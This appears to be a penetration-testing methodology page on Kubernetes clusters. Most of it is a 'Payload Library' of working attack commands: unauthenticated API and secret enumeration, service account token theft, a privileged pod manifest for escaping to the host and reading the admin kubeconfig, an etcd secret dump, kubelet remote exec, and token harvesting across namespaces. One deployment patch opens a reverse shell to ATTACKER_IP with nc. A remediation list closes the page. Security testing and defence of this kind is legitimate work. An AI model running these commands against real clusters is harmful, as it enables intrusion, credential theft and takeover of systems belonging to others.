---
title: "Kubernetes Security Testing"
date: 2026-02-24
draft: false
---

# Kubernetes Security Testing

> **Severity**: Critical | **CWE**: CWE-284, CWE-269
> **OWASP**: A01:2021 – Broken Access Control | A05:2021 – Security Misconfiguration

---

## What Is the Kubernetes Attack Surface?

Kubernetes clusters expose a rich attack surface: the API server (the central control plane), kubelet APIs on each node, etcd (cluster state store containing secrets in plaintext), dashboard UIs, and internal service mesh. Misconfigurations range from completely unauthenticated API servers to overly permissive RBAC rules, privileged containers, and default service account token abuse.

```
Kubernetes attack paths:
  External → API server (unauthenticated or weak token)
  External → Kubernetes dashboard (exposed + no auth)
  Internal → steal service account token from pod → API calls
  Internal → privileged pod → escape to host node
  Internal → etcd direct access (port 2379) → read all secrets
  Internal → kubelet API (port 10250) → exec into any pod on node
```

---

## Discovery Checklist

**Phase 1 — External Exposure**
- [ ] Scan for API server: TCP 6443 (HTTPS) and 8080 (HTTP, unauthenticated in old clusters)
- [ ] Scan for kubelet: TCP 10250 (HTTPS), 10255 (HTTP read-only, deprecated)
- [ ] Scan for etcd: TCP 2379, 2380
- [ ] Scan for Kubernetes dashboard: TCP 443, 8001, 30000–32767 (NodePort)
- [ ] Check for exposed `kubeconfig` files in public repos, S3 buckets, paste sites
- [ ] Check `.kube/config` in web app source repos (git history)

**Phase 2 — API Server Authentication**
- [ ] Test anonymous access: `kubectl --server=https://API_SERVER:6443 --insecure-skip-tls-verify get pods`
- [ ] Test with service account tokens found in pods or leaked
- [ ] Check `system:anonymous` bindings in ClusterRoleBinding
- [ ] Test `system:unauthenticated` group permissions

**Phase 3 — Authorization (RBAC)**
- [ ] Enumerate what the current token can do: `kubectl auth can-i --list`
- [ ] Check for wildcard permissions: `*` in verbs or resources
- [ ] Check for `cluster-admin` bound to broad subjects
- [ ] Look for `RBAC` misconfigurations: secrets read, pod create, exec, escalate

---

## Payload Library

### Payload 1 — API Server Enumeration (Unauthenticated)

```bash
# Test unauthenticated API access:
kubectl --server=https://TARGET:6443 --insecure-skip-tls-verify \
  --username="" --password="" get pods --all-namespaces 2>&1

# Or via curl:
curl -sk https://TARGET:6443/api/v1/namespaces | python3 -m json.tool

# Check API server version (often public):
curl -sk https://TARGET:6443/version

# List namespaces (unauthenticated):
curl -sk https://TARGET:6443/api/v1/namespaces

# List pods (unauthenticated):
curl -sk https://TARGET:6443/api/v1/pods

# List secrets (unauthenticated — game over if this works):
curl -sk https://TARGET:6443/api/v1/secrets

# HTTP API server (port 8080 — insecure, legacy — pre-1.20 clusters):
curl http://TARGET:8080/api/v1/namespaces
curl http://TARGET:8080/api/v1/secrets
curl http://TARGET:8080/apis/apps/v1/deployments --all-namespaces

# Check RBAC for anonymous/unauthenticated:
curl -sk https://TARGET:6443/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview",
       "spec":{"resourceAttributes":{"resource":"pods","verb":"list"}}}'
```

### Payload 2 — Service Account Token Abuse

```bash
# From inside a compromised pod — find service account token:
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Export for kubectl use outside the pod:
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
export APISERVER=https://kubernetes.default.svc

# Check what the token can do:
kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify \
  auth can-i --list

# Or via API:
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -X POST -H "Content-Type: application/json" \
  -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",
       \"spec\":{\"namespace\":\"$NAMESPACE\"}}" | python3 -m json.tool

# List secrets in namespace:
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets" | python3 -m json.tool

# Read specific secret (e.g., database credentials):
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/default/secrets/db-credentials" | \
  python3 -c "
import sys, json, base64
s = json.load(sys.stdin)
for k, v in s.get('data', {}).items():
    print(f'{k}: {base64.b64decode(v).decode()}')
"

# List all secrets across all namespaces (if cluster-admin):
kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify \
  get secrets --all-namespaces -o json | \
  python3 -c "
import sys, json, base64
d = json.load(sys.stdin)
for item in d.get('items', []):
    ns = item['metadata']['namespace']
    name = item['metadata']['name']
    for k, v in item.get('data', {}).items():
        try:
            decoded = base64.b64decode(v).decode()
            if len(decoded) > 5:
                print(f'{ns}/{name}/{k}: {decoded[:100]}')
        except: pass
"
```

### Payload 3 — Pod Privilege Escalation

```bash
# Create privileged pod to escape to host (requires pod/create permission):
kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify \
  apply -f - << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: privesc-pod
  namespace: default
spec:
  hostPID: true
  hostNetwork: true
  hostIPC: true
  containers:
  - name: pwn
    image: alpine:latest
    command: ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
  restartPolicy: Never
  # If node has no alpine image pull, use an existing image:
  # image: k8s.gcr.io/pause:3.1
EOF

# Wait for pod to start:
kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify \
  wait pod/privesc-pod --for=condition=Ready --timeout=30s

# Exec into pod → access host filesystem:
kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify \
  exec -it privesc-pod -- chroot /host bash

# From inside: read host tokens, escalate to cluster-admin:
cat /etc/kubernetes/admin.conf   # cluster admin kubeconfig on control plane node
cat /etc/kubernetes/controller-manager.conf
ls /etc/kubernetes/pki/          # cluster CA and admin certs

# Alternative pod manifest — mount host volume only:
cat << 'EOF' | kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: hostmount-pod
spec:
  containers:
  - name: alpine
    image: alpine
    command: ["sleep", "3600"]
    volumeMounts:
    - name: host-vol
      mountPath: /mnt/host
  volumes:
  - name: host-vol
    hostPath:
      path: /
EOF

# Read host kubeconfig:
kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify \
  exec hostmount-pod -- cat /mnt/host/etc/kubernetes/admin.conf
```

### Payload 4 — etcd Direct Access

```bash
# etcd on port 2379 — may be accessible from within cluster or if exposed:
# Contains all cluster state including secrets

# Check etcd accessibility:
curl --cacert /etc/kubernetes/pki/etcd/ca.crt \
     --cert /etc/kubernetes/pki/etcd/peer.crt \
     --key /etc/kubernetes/pki/etcd/peer.key \
     https://127.0.0.1:2379/version 2>/dev/null

# Without certs (if TLS client auth disabled):
ETCDCTL_API=3 etcdctl --endpoints=http://ETCD_HOST:2379 get "" --prefix --keys-only

# Dump all secrets from etcd:
ETCDCTL_API=3 etcdctl \
  --endpoints=https://ETCD_HOST:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/peer.crt \
  --key=/etc/kubernetes/pki/etcd/peer.key \
  get /registry/secrets --prefix --print-value-only | \
  strings | grep -A2 "password\|token\|secret\|key"

# Read specific secret from etcd:
ETCDCTL_API=3 etcdctl \
  --endpoints=https://ETCD_HOST:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/peer.crt \
  --key=/etc/kubernetes/pki/etcd/peer.key \
  get /registry/secrets/default/my-secret

# Decode etcd protobuf secret:
ETCDCTL_API=3 etcdctl ... get /registry/secrets/default/my-secret | \
  python3 -c "
import sys, base64
data = sys.stdin.buffer.read()
# Try to find base64-encoded values after 'k8s\x00\x0a\x0d' header:
import re
matches = re.findall(b'[A-Za-z0-9+/]{20,}={0,2}', data)
for m in matches:
    try:
        print(base64.b64decode(m).decode())
    except: pass
"
```

### Payload 5 — Kubelet API Exploitation

```bash
# Kubelet API on port 10250 (HTTPS) — may allow pod exec without cluster-level auth:
# Test anonymous access:
curl -sk https://NODE_IP:10250/pods | python3 -m json.tool | head -50

# List pods on a specific node:
curl -sk https://NODE_IP:10250/pods | \
  python3 -c "
import sys, json
pods = json.load(sys.stdin)
for item in pods.get('items', []):
    meta = item['metadata']
    print(f\"{meta.get('namespace')}/{meta.get('name')} → {[c['name'] for c in item['spec']['containers']]}\")
"

# Exec command in pod via kubelet (if anonymous exec is allowed):
# POST /run/{namespace}/{pod}/{container}
curl -sk -X POST \
  "https://NODE_IP:10250/run/default/TARGET_POD/TARGET_CONTAINER" \
  -d "cmd=cat /etc/passwd"

# Newer clusters require auth for kubelet exec:
# /exec endpoint with token:
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://NODE_IP:10250/pods"

# Port 10255 (read-only, deprecated but still present on older clusters):
curl -sk http://NODE_IP:10255/pods | python3 -m json.tool

# kubeletctl — automated kubelet exploitation:
git clone https://github.com/cyberark/kubeletctl
./kubeletctl scan rce --server NODE_IP
./kubeletctl exec "id" -p TARGET_POD -c TARGET_CONTAINER --server NODE_IP
./kubeletctl exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" \
  -p TARGET_POD -c TARGET_CONTAINER --server NODE_IP
```

### Payload 6 — RBAC Misconfiguration Exploitation

```bash
# Check for wildcard permissions:
kubectl auth can-i '*' '*' --all-namespaces --token=$TOKEN \
  --server=$APISERVER --insecure-skip-tls-verify

# Look for dangerous RBAC bindings:
# cluster-admin bound to default service account:
kubectl get clusterrolebinding -o json | \
  python3 -c "
import sys, json
crbs = json.load(sys.stdin)
for crb in crbs.get('items', []):
    role = crb.get('roleRef', {}).get('name')
    subjects = crb.get('subjects', [])
    for s in subjects:
        if s.get('name') in ['default', 'system:serviceaccounts'] or \
           s.get('kind') == 'Group' and s.get('name') in ['system:authenticated', 'system:unauthenticated']:
            print(f'[!!!] {crb[\"metadata\"][\"name\"]}: {role} → {s}')
"

# Exploit pod/exec permission → RCE in any pod:
kubectl exec -it EXISTING_POD --token=$TOKEN --server=$APISERVER \
  --insecure-skip-tls-verify -- /bin/sh

# Exploit create/patch deployment → inject malicious image:
kubectl patch deployment TARGET_DEPLOY \
  --patch '{"spec":{"template":{"spec":{"containers":[{"name":"app","image":"alpine","command":["nc","-e","/bin/sh","ATTACKER_IP","4444"]}]}}}}' \
  --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify

# Exploit get secrets + nodes → collect all service account tokens:
for namespace in $(kubectl get ns -o name --token=$TOKEN --server=$APISERVER \
  --insecure-skip-tls-verify | cut -d/ -f2); do
  kubectl get secrets -n $namespace --token=$TOKEN --server=$APISERVER \
    --insecure-skip-tls-verify -o json 2>/dev/null | \
    python3 -c "
import sys, json, base64
for item in json.load(sys.stdin).get('items', []):
    if item.get('type') == 'kubernetes.io/service-account-token':
        ns = item['metadata']['namespace']
        name = item['metadata']['name']
        token = base64.b64decode(item.get('data', {}).get('token', '')).decode()
        print(f'{ns}/{name}: {token[:50]}...')
"
done
```

---

## Tools

```bash
# kubectl — primary k8s CLI:
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"

# kube-hunter — automated Kubernetes vulnerability scanner:
pip3 install kube-hunter
kube-hunter --remote TARGET_IP  # external scan
kube-hunter --pod               # from inside a pod
kube-hunter --cidr 10.0.0.0/24  # scan a network range

# kubeletctl — kubelet-specific testing:
git clone https://github.com/cyberark/kubeletctl

# Peirates — Kubernetes penetration testing tool:
git clone https://github.com/inguardians/peirates

# truffleHog / gitleaks — find kubeconfig in repos:
trufflehog github --org TARGET_ORG --only-verified
gitleaks detect --source=. -v

# Shodan — find exposed Kubernetes clusters:
shodan search "port:6443 product:Kubernetes"
shodan search "port:8080 Kubernetes"
shodan search "port:10250 kubelet"

# Check cluster health and misconfigurations from inside:
# Enumerate all resources you can access:
kubectl api-resources --verbs=list -o name --token=$TOKEN \
  --server=$APISERVER --insecure-skip-tls-verify | \
  xargs -I{} kubectl get {} --all-namespaces --token=$TOKEN \
  --server=$APISERVER --insecure-skip-tls-verify 2>/dev/null | head -200

# RBAC analysis — rbac-tool:
kubectl-rbac-tool lookup system:serviceaccount:default:default
kubectl-rbac-tool who-can get secrets

# Falco — runtime security (for defenders, but understand what it detects):
# Detects: kubectl exec, unexpected file access, privilege escalation
```

---

## Remediation Reference

- **Disable anonymous authentication**: set `--anonymous-auth=false` on the API server
- **Enable RBAC and audit logging**: ensure `--authorization-mode` includes `RBAC`; disable legacy `AlwaysAllow`
- **Restrict default service account**: bind only the minimum permissions; set `automountServiceAccountToken: false` in pod specs that don't need API access
- **Network policies**: restrict pod-to-pod and pod-to-apiserver communication — pods should not have unrestricted access to the Kubernetes API
- **Protect etcd**: bind etcd to localhost only; require mutual TLS; encrypt secrets at rest (`--encryption-provider-config`)
- **Kubelet security**: set `--anonymous-auth=false` on kubelets; set `--authorization-mode=Webhook` to require API server authorization for kubelet requests
- **Pod Security Standards**: use `enforce: restricted` policy to prevent privileged pods, host namespace access, and hostPath mounts
- **Secrets management**: use external secrets managers (Vault, AWS Secrets Manager) instead of Kubernetes Secrets — native Secrets are base64, not encrypted, and end up in etcd

*Part of the Web Application Penetration Testing Methodology series.*
